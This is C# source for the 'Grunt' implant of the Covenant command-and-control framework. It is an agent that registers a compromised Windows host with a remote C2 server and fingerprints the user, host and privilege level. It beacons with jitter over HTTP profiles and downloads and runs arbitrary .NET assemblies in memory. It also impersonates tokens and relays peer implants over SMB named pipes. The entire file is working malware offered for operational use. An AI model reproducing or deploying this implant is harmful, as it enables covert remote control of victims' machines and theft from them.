using System;
using System.Net;
using System.Linq;
using System.Text;
using System.IO;
using System.IO.Pipes;
using System.IO.Compression;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace GruntExecutor
{
    class Grunt
    {
        public static void Execute(string CovenantURI, string CovenantCertHash, string GUID, Aes SessionKey)
        {
            try
            {
                int Delay = Convert.ToInt32(@"{{REPLACE_DELAY}}");
                int Jitter = Convert.ToInt32(@"{{REPLACE_JITTER_PERCENT}}");
                int ConnectAttempts = Convert.ToInt32(@"{{REPLACE_CONNECT_ATTEMPTS}}");
                DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REPLACE_KILL_DATE}}"));
				List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
				List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
				string ProfileHttpGetResponse = @"{{REPLACE_PROFILE_HTTP_GET_RESPONSE}}".Replace(Environment.NewLine, "\n");
				string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
				string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool UseCertPinning = bool.Parse(@"{{REPLACE_USE_CERT_PINNING}}");

                string Hostname = Dns.GetHostName();
                string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        IPAddress = a.ToString();
                        break;
                    }
                }
                string OperatingSystem = Environment.OSVersion.ToString();
                string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
                int Integrity = 2;
                if (Environment.UserName.ToLower() == "system")
                {
                    Integrity = 4;
                }
                else
                {
                    var identity = WindowsIdentity.GetCurrent();
                    if (identity.Owner != identity.User)
                    {
                        Integrity = 3;
                    }
                }
                string UserDomainName = Environment.UserDomainName;
                string UserName = Environment.UserName;

                string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                IMessenger baseMessenger = null;
                baseMessenger = new HttpMessenger(CovenantURI, CovenantCertHash, UseCertPinning, ValidateCert, ProfileHttpHeaderNames, ProfileHttpHeaderValues, ProfileHttpUrls);
                baseMessenger.Read();
                baseMessenger.Identifier = GUID;
                TaskingMessenger messenger = new TaskingMessenger
                (
                    new MessageCrafter(GUID, SessionKey),
                    baseMessenger,
                    new Profile(ProfileHttpGetResponse, ProfileHttpPostRequest, ProfileHttpPostResponse)
                );
                messenger.WriteTaskingMessage(RegisterBody);
                messenger.SetAuthenticator(messenger.ReadTaskingMessage().Message);
                try
                {
                    // A blank upward write, this helps in some cases with an HTTP Proxy
                    messenger.WriteTaskingMessage("");
                }
                catch (Exception) {}

                List<KeyValuePair<string, Thread>> Jobs = new List<KeyValuePair<string, Thread>>();
                WindowsImpersonationContext impersonationContext = null;
                Random rnd = new Random();
                int ConnectAttemptCount = 0;
                bool alive = true;
                while (alive)
                {
                    int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
                    if (rnd.Next(2) == 0) { change = -change; }
                    Thread.Sleep((Delay + change) * 1000);
                    try
                    {
                        GruntTaskingMessage message = messenger.ReadTaskingMessage();
                        if (message == null)
                        {
                            ConnectAttemptCount++;
                        }
                        else
                        {
                            ConnectAttemptCount = 0;
                            string output = "";
                            if (message.Type == GruntTaskingType.SetDelay || message.Type == GruntTaskingType.SetJitter || message.Type == GruntTaskingType.SetConnectAttempts)
                            {
                                if (int.TryParse(message.Message, out int val))
                                {
                                    if (message.Type == GruntTaskingType.SetDelay)
                                    {
                                        Delay = val;
                                        output += "Set Delay: " + Delay;
                                    }
                                    else if (message.Type == GruntTaskingType.SetJitter)
                                    {
                                        Jitter = val;
                                        output += "Set Jitter: " + Jitter;
                                    }
                                    else if (message.Type == GruntTaskingType.SetConnectAttempts)
                                    {
                                        ConnectAttempts = val;
                                        output += "Set ConnectAttempts: " + ConnectAttempts;
                                    }
                                }
                                else
                                {
                                    output += "Error parsing: " + message.Message.Split(',')[1];
                                }
                                messenger.WriteTaskingMessage(output, message.Name);
                            }
                            else if (message.Type == GruntTaskingType.Kill)
                            {
                                output += "Killed";
                                messenger.WriteTaskingMessage(output, message.Name);
                                return;
                            }
                            else if(message.Type == GruntTaskingType.Jobs)
                            {
                                if (!Jobs.Where(J => J.Value.IsAlive).Any()) { output += "No active tasks!"; }
                                else
                                {
                                    output += "Task       Status" + Environment.NewLine;
                                    output += "----       ------" + Environment.NewLine;
                                    output += String.Join(Environment.NewLine, Jobs.Where(J => J.Value.IsAlive).Select(J => J.Key + " Active").ToArray());
                                }
                                messenger.WriteTaskingMessage(output, message.Name);
                            }
                            else if (message.Token)
                            {
                                if (impersonationContext != null)
                                {
                                    impersonationContext.Undo();
                                }
                                IntPtr impersonatedToken = IntPtr.Zero;
                                Thread t = new Thread(() => impersonatedToken = TaskExecute(messenger, message));
                                t.Start();
                                Jobs.Add(new KeyValuePair<string, Thread>(message.Name, t));
                                bool completed = t.Join(5000);
                                if (completed && impersonatedToken != IntPtr.Zero)
                                {
                                    try
                                    {
                                        WindowsIdentity identity = new WindowsIdentity(impersonatedToken);
                                        impersonationContext = identity.Impersonate();
                                    }
                                    catch (ArgumentException) { }
                                }
                                else
                                {
                                    impersonationContext = null;
                                }
                            }
                            else
                            {
                                Thread t = new Thread(() => TaskExecute(messenger, message));
                                t.Start();
                                Jobs.Add(new KeyValuePair<string, Thread>(message.Name, t));
                            }
                        }
                    }
                    catch (ObjectDisposedException e)
                    {
                        ConnectAttemptCount++;
                        messenger.WriteTaskingMessage("");
                    }
                    catch (Exception e)
                    {
                        ConnectAttemptCount++;
                        Console.Error.WriteLine("Loop Exception: " + e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                    if (ConnectAttemptCount >= ConnectAttempts) { return; }
                    if (KillDate.CompareTo(DateTime.Now) < 0) { return; }
                }
            }
            catch (Exception e) {
                Console.Error.WriteLine("Outer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
            }
        }

        private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message)
        {
            string output = "";
            try
            {
                if (message.Type == GruntTaskingType.Assembly)
                {
                    string[] pieces = message.Message.Split(',');
                    if (pieces.Length > 0)
                    {
                        object[] parameters = null;
                        if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                        byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                        byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                        Assembly gruntTask = Assembly.Load(decompressedBytes);
                        var results = gruntTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                        if (results != null) { output += (string)results; }
                    }
                }
                else if (message.Type == GruntTaskingType.Connect)
                {
                    string[] split = message.Message.Split(',');
                    bool connected = messenger.Connect(split[0], split[1]);
                    output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
                                          "Connection to " + split[0] + ":" + split[1] + " failed.";
                }
                else if (message.Type == GruntTaskingType.Disconnect)
                {
                    bool disconnected = messenger.Disconnect(message.Message);
                    output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
                }
            }
            catch (Exception e)
            {
                output += "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace;
            }
            finally
            {
                try
                {
                    messenger.WriteTaskingMessage(output, message.Name);
                }
                catch (Exception) { }
            }
            return WindowsIdentity.GetCurrent().Token;
        }
    }

    public interface IMessenger
    {
        string Hostname { get; }
        string Identifier { get; set; }
        string Authenticator { get; set; }
        string Read();
        void Write(string Message);
        void Close();
    }

    public class Profile
    {
        private string GetResponse { get; }
        private string PostRequest { get; }
        private string PostResponse { get; }

        public Profile(string GetResponse, string PostRequest, string PostResponse)
        {
            this.GetResponse = GetResponse;
            this.PostRequest = PostRequest;
            this.PostResponse = PostResponse;
        }

        public GruntEncryptedMessage ParseGetResponse(string Message) { return Parse(this.GetResponse, Message); }
        public GruntEncryptedMessage ParsePostRequest(string Message) { return Parse(this.PostRequest, Message); }
        public GruntEncryptedMessage ParsePostResponse(string Message) { return Parse(this.PostResponse, Message); }
        public string FormatGetResponse(GruntEncryptedMessage Message) { return Format(this.GetResponse, Message); }
        public string FormatPostRequest(GruntEncryptedMessage Message) { return Format(this.PostRequest, Message); }
        public string FormatPostResponse(GruntEncryptedMessage Message) { return Format(this.PostResponse, Message); }

        private static GruntEncryptedMessage Parse(string Format, string Message)
        {
            string json = Common.GruntEncoding.GetString(Utilities.HttpMessageTransform.Invert(
                Utilities.Parse(Message, Format)[0]
            ));
            if (json == null || json.Length < 3)
            {
                return null;
            }
            return GruntEncryptedMessage.FromJson(json);
        }

        private static string Format(string Format, GruntEncryptedMessage Message)
        {
            return String.Format(Format,
                Utilities.HttpMessageTransform.Transform(Common.GruntEncoding.GetBytes(GruntEncryptedMessage.ToJson(Message)))
            );
        }
    }

    public class TaskingMessenger
    {
        private object _UpstreamLock = new object();
        
        private IMessenger UpstreamMessenger { get; set; }
        private MessageCrafter Crafter { get; }
        private Profile Profile { get; }

        protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();

        public TaskingMessenger(MessageCrafter Crafter, IMessenger Messenger, Profile Profile)
        {
            this.Crafter = Crafter;
            this.UpstreamMessenger = Messenger;
            this.Profile = Profile;
        }

        public GruntTaskingMessage ReadTaskingMessage()
        {
            // TODO: why does this need to be PostResponse?
            string read = "";
            lock (_UpstreamLock)
            {
                read = this.UpstreamMessenger.Read();
            }
            if (read == null)
            {
                return null;
            }
            GruntEncryptedMessage gruntMessage = this.Profile.ParsePostResponse(read);
            if (gruntMessage == null)
            {
                return null;
            }
            else if (gruntMessage.Type == GruntEncryptedMessage.GruntEncryptedMessageType.Tasking)
            {
                string json = this.Crafter.Retrieve(gruntMessage);
                return (json == null || json == "") ? null : GruntTaskingMessage.FromJson(json);
            }
            else
            {
                string json = this.Crafter.Retrieve(gruntMessage);
                GruntEncryptedMessage wrappedMessage = GruntEncryptedMessage.FromJson(json);
                IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.GUID);
                if (relay != null)
                {
                    // TODO: why does this need to be PostResponse?
                    relay.Write(this.Profile.FormatPostResponse(wrappedMessage));
                }
                return null;
            }
        }

        public void WriteTaskingMessage(string Message, string Meta = "")
        {
            GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
            string uploaded = this.Profile.FormatPostRequest(gruntMessage);
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Write(uploaded);
            }
        }

        public void SetAuthenticator(string Authenticator)
        {
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Authenticator = Authenticator;
            }
        }

        public bool Connect(string Hostname, string PipeName)
        {
            IMessenger olddownstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Hostname.ToLower() == (Hostname + ":" + PipeName).ToLower());
            if (olddownstream != null)
            {
                olddownstream.Close();
                this.DownstreamMessengers.Remove(olddownstream);
            }

            SMBMessenger downstream = new SMBMessenger(Hostname, PipeName);
            Thread readThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        string read = downstream.Read();
                        if (downstream.Identifier == "")
                        {
                            GruntEncryptedMessage message = this.Profile.ParsePostRequest(read);
                            if (message.GUID.Length == 20)
                            {
                                 downstream.Identifier = message.GUID.Substring(10);
                            }
                            else if (message.GUID.Length == 10)
                            {
                                downstream.Identifier = message.GUID;
                            }
                        }
                        this.UpstreamMessenger.Write(read);
                    }
                    catch (ThreadAbortException)
                    {
                        return;
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                }
            });
            downstream.ReadThread = readThread;
            downstream.ReadThread.Start();
            this.DownstreamMessengers.Add(downstream);
            return true;
        }

        public bool Disconnect(string Identifier)
        {
            IMessenger downstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier.ToLower() == Identifier.ToLower());
            if (downstream != null)
            {
                downstream.Close();
                this.DownstreamMessengers.Remove(downstream);
                return true;
            }
            return false;
        }
    }

    public class SMBMessenger : IMessenger
    {
        public string Hostname { get; } = "";
        public string Identifier { get; set; } = "";
        public string Authenticator { get; set; } = "";

        private object _WritePipeLock = new object();
        private PipeStream Pipe { get; set; }
        private string PipeName { get; }
        public Thread ReadThread { get; set; } = null;

        public SMBMessenger(NamedPipeServerStream ServerPipe, string PipeName)
        {
            this.PipeName = PipeName;
            this.Hostname = "localhost:" + PipeName;
            this.Pipe = ServerPipe;
            new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        PipeSecurity ps = new PipeSecurity();
                        ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
                        NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                        newServerPipe.WaitForConnection();
                        lock (this._WritePipeLock)
                        {
                            this.Pipe.Close();
                            this.Pipe = newServerPipe;
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("NamedPipeServer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                }
            }).Start();
        }

        public SMBMessenger(string Hostname, string PipeName = "gruntsvc", int Timeout = 5000)
        {
            this.Hostname = Hostname;
            this.PipeName = PipeName;
            NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, this.PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
            ClientPipe.Connect(Timeout);
            ClientPipe.ReadMode = PipeTransmissionMode.Byte;
            this.Pipe = ClientPipe;
        }

        public string Read()
        {
            return Common.GruntEncoding.GetString(this.ReadBytes());
        }

        public void Write(string Message)
        {
            this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
        }

        public void Close()
        {
            lock (this._WritePipeLock)
            {
                this.Pipe.Close();
            }
            if (ReadThread != null)
            {
                this.ReadThread.Abort();
            }
        }

        private void WriteBytes(byte[] bytes)
        {
            lock (this._WritePipeLock)
            {
                byte[] compressed = Utilities.Compress(bytes);
                byte[] size = new byte[4];
                size[0] = (byte)(compressed.Length >> 24);
                size[1] = (byte)(compressed.Length >> 16);
                size[2] = (byte)(compressed.Length >> 8);
                size[3] = (byte)compressed.Length;
                this.Pipe.Write(size, 0, size.Length);
                var writtenBytes = 0;
                while (writtenBytes < compressed.Length)
                {
                    int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
                    this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
                    writtenBytes += bytesToWrite;
                }
            }
        }

        private byte[] ReadBytes()
        {
            byte[] size = new byte[4];
            int totalReadBytes = 0;
            do
            {
                totalReadBytes += this.Pipe.Read(size, 0, size.Length);
            } while (totalReadBytes < size.Length);
            int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];

            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                totalReadBytes = 0;
                int readBytes = 0;
                do
                {
                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                    totalReadBytes += readBytes;
                } while (totalReadBytes < len);
                return Utilities.Decompress(ms.ToArray());
            }
        }
    }

    public class HttpMessenger : IMessenger
    {
        public string Hostname { get; } = "";
        public string Identifier { get; set; } = "";
        public string Authenticator { get; set; } = "";

        private string CovenantURI { get; }
        private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
        private object _WebClientLock = new object();

        private Random Random { get; set; } = new Random();
        private List<string> ProfileHttpHeaderNames { get; }
        private List<string> ProfileHttpHeaderValues { get; }
        private List<string> ProfileHttpUrls { get; }

        private bool UseCertPinning { get; set; }
        private bool ValidateCert { get; set; }

        private string ToReadValue { get; set; } = "";

        public HttpMessenger(string CovenantURI, string CovenantCertHash, bool UseCertPinning, bool ValidateCert, List<string> ProfileHttpHeaderNames, List<string> ProfileHttpHeaderValues, List<string> ProfileHttpUrls)
        {
            this.CovenantURI = CovenantURI;
            this.Hostname = CovenantURI.Split(':')[1].Split('/')[2];
            this.ProfileHttpHeaderNames = ProfileHttpHeaderNames;
            this.ProfileHttpHeaderValues = ProfileHttpHeaderValues;
            this.ProfileHttpUrls = ProfileHttpUrls;

            this.CovenantClient.UseDefaultCredentials = true;
            this.CovenantClient.Proxy = WebRequest.DefaultWebProxy;
            this.CovenantClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;

            this.UseCertPinning = UseCertPinning;
            this.ValidateCert = ValidateCert;

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
            {
                bool valid = true;
                if (this.UseCertPinning && CovenantCertHash != "")
                {
                    valid = cert.GetCertHashString() == CovenantCertHash;
                }
                if (valid && this.ValidateCert)
                {
                    valid = errors == System.Net.Security.SslPolicyErrors.None;
                }
                return valid;
            };
        }

        public string Read()
        {
            if (ToReadValue != "")
            {
                string temp = ToReadValue;
                ToReadValue = "";
                return temp;
            }
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                return this.CovenantClient.DownloadString(this.CovenantURI + this.GetURL());
            }
        }

        public void Write(string Message)
        {
            lock (this._WebClientLock)
            {
                this.SetupCookieWebClient();
                this.ToReadValue = this.CovenantClient.UploadString(this.CovenantURI + this.GetURL(), Message);
            }
        }

        public void Close() { }

        private string GetURL()
        {
            return this.ProfileHttpUrls[this.Random.Next(this.ProfileHttpUrls.Count)];
        }

        private void SetupCookieWebClient()
        {
            for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
            {
                this.CovenantClient.Headers.Set(ProfileHttpHeaderNames[i], ProfileHttpHeaderValues[i]);
                if (ProfileHttpHeaderNames[i] == "Cookies")
                {
                    this.CovenantClient.SetCookies(new Uri(this.CovenantURI), ProfileHttpHeaderValues[i].Replace(";", ","));
                }
            }
        }
    }

    public class MessageCrafter
    {
        private string GUID { get; }
        private Aes SessionKey { get; }

        public MessageCrafter(string GUID, Aes SessionKey)
        {
            this.GUID = GUID;
            this.SessionKey = SessionKey;
        }

        public GruntEncryptedMessage Create(string Message, string Meta = "")
        {
            return this.Create(Common.GruntEncoding.GetBytes(Message), Meta);
        }

        public GruntEncryptedMessage Create(byte[] Message, string Meta = "")
        {
            byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessionKey.Key);
            byte[] encryptionIV = new byte[Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
            byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);

            byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
            return new GruntEncryptedMessage
            {
                GUID = this.GUID,
                Meta = Meta,
                EncryptedMessage = Convert.ToBase64String(encryptedMessage),
                IV = Convert.ToBase64String(encryptionIV),
                HMAC = Convert.ToBase64String(hmac)
            };
        }

        public string Retrieve(GruntEncryptedMessage message)
        {
            if (message == null || !message.VerifyHMAC(this.SessionKey.Key))
            {
                return null;
            }
            return Common.GruntEncoding.GetString(Utilities.AesDecrypt(message, SessionKey.Key));
        }
    }

    public class CookieWebClient : WebClient
    {
        private CookieContainer CookieContainer { get; }
        public CookieWebClient()
        {
            this.CookieContainer = new CookieContainer();
        }
        public void SetCookies(Uri uri, string cookies)
        {
            this.CookieContainer.SetCookies(uri, cookies);
        }
        protected override WebRequest GetWebRequest(Uri address)
        {
            var request = base.GetWebRequest(address) as HttpWebRequest;
            if (request == null) return base.GetWebRequest(address);
            request.CookieContainer = CookieContainer;
            return request;
        }
    }

    public enum GruntTaskingType
    {
        Assembly,
        SetDelay,
        SetJitter,
        SetConnectAttempts,
        Kill,
        Connect,
        Disconnect,
        Jobs
    }

    public class GruntTaskingMessage
    {
        public GruntTaskingType Type { get; set; }
        public string Name { get; set; }
        public string Message { get; set; }
        public bool Token { get; set; }

        private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
        public static GruntTaskingMessage FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat.Replace("{{", "{").Replace("}}", "}"));
            if (parseList.Count < 3)  { return null; }
            return new GruntTaskingMessage
            {
				Type = (GruntTaskingType) Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
                Name = parseList[1],
                Message = parseList[2],
                Token = Convert.ToBoolean(parseList[3])
            };
        }

        public static string ToJson(GruntTaskingMessage message)
        {
            return String.Format(
                GruntTaskingMessageFormat,
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Name),
                Utilities.JavaScriptStringEncode(message.Message),
                message.Token
            );
        }
    }

    public class GruntEncryptedMessage
    {
        public enum GruntEncryptedMessageType
        {
            Routing,
            Tasking
        }

		public string GUID { get; set; } = "";
        public GruntEncryptedMessageType Type { get; set; }
        public string Meta { get; set; } = "";
		public string IV { get; set; } = "";
		public string EncryptedMessage { get; set; } = "";
		public string HMAC { get; set; } = "";

        public bool VerifyHMAC(byte[] Key)
        {
            if (EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
            try
            {
                var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
                return Utilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
            }
            catch
            {
                return false;
            }
        }

        private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
        public static GruntEncryptedMessage FromJson(string message)
        {
			List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat.Replace("{{", "{").Replace("}}", "}"));
            if (parseList.Count < 5)  { return null; }
            return new GruntEncryptedMessage
            {
                GUID = parseList[0],
                Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
                Meta = parseList[2],
                IV = parseList[3],
                EncryptedMessage = parseList[4],
                HMAC = parseList[5]
            };
        }

        public static string ToJson(GruntEncryptedMessage message)
        {
            return String.Format(
                GruntEncryptedMessageFormat,
                Utilities.JavaScriptStringEncode(message.GUID),
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Meta),
                Utilities.JavaScriptStringEncode(message.IV),
                Utilities.JavaScriptStringEncode(message.EncryptedMessage),
                Utilities.JavaScriptStringEncode(message.HMAC)
            );
        }
    }

    public static class Common
    {
        public static int AesIVLength = 16;
        public static CipherMode AesCipherMode = CipherMode.CBC;
        public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
        public static Encoding GruntEncoding = Encoding.UTF8;
    }

    public static class Utilities
    {
        // Returns IV (16 bytes) + EncryptedData byte array
        public static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            SessionKey.Mode = Common.AesCipherMode;
            SessionKey.Padding = Common.AesPaddingMode;
            SessionKey.GenerateIV();
            SessionKey.Key = key;

            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
            byte[] result = new byte[SessionKey.IV.Length + encrypted.Length];
            Buffer.BlockCopy(SessionKey.IV, 0, result, 0, SessionKey.IV.Length);
            Buffer.BlockCopy(encrypted, 0, result, SessionKey.IV.Length, encrypted.Length);
            return result;
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            byte[] iv = new byte[Common.AesIVLength];
            Buffer.BlockCopy(data, 0, iv, 0, Common.AesIVLength);
            SessionKey.IV = iv;
            SessionKey.Key = key;
            byte[] encryptedData = new byte[data.Length - Common.AesIVLength];
            Buffer.BlockCopy(data, Common.AesIVLength, encryptedData, 0, data.Length - Common.AesIVLength);
            byte[] decrypted = SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);

            return decrypted;
        }

        // Convenience method for decrypting an EncryptedMessagePacket
        public static byte[] AesDecrypt(GruntEncryptedMessage encryptedMessage, byte[] key)
        {
            byte[] iv = Convert.FromBase64String(encryptedMessage.IV);
            byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncryptedMessage);
            byte[] combined = new byte[iv.Length + encrypted.Length];
            Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);
            Buffer.BlockCopy(encrypted, 0, combined, iv.Length, encrypted.Length);

            return AesDecrypt(combined, key);
        }

        public static byte[] ComputeHMAC(byte[] data, byte[] key)
        {
            HMACSHA256 SessionHmac = new HMACSHA256(key);
            return SessionHmac.ComputeHash(data);
        }

        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
        {
            HMACSHA256 hmac = new HMACSHA256(key);
            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);
            // Should do double hmac?
            return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
        }

        public static byte[] Compress(byte[] bytes)
        {
            byte[] compressedBytes;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
                {
                    deflateStream.Write(bytes, 0, bytes.Length);
                }
                compressedBytes = memoryStream.ToArray();
            }
            return compressedBytes;
        }

        public static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{");
			if(format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if(format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if(format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if(format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if(format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if(format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs
        public static string JavaScriptStringEncode(string value)
        {
            if (String.IsNullOrEmpty(value)) { return String.Empty; }
            int len = value.Length;
            bool needEncode = false;
            char c;
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)
                {
                    needEncode = true;
                    break;
                }
            }
            if (!needEncode) { return value; }

            var sb = new StringBuilder();
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)
                {
                    sb.AppendFormat("\\u{0:x4}", (int)c);
                }
                else
                {
                    switch ((int)c)
                    {
                        case 8:
                            sb.Append("\\b");
                            break;
                        case 9:
                            sb.Append("\\t");
                            break;
                        case 10:
                            sb.Append("\\n");
                            break;
                        case 12:
                            sb.Append("\\f");
                            break;
                        case 13:
                            sb.Append("\\r");
                            break;
                        case 34:
                            sb.Append("\\\"");
                            break;
                        case 92:
                            sb.Append("\\\\");
                            break;
                        default:
                            sb.Append(c);
                            break;
                    }
                }
            }
            return sb.ToString();
        }

        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
    }
}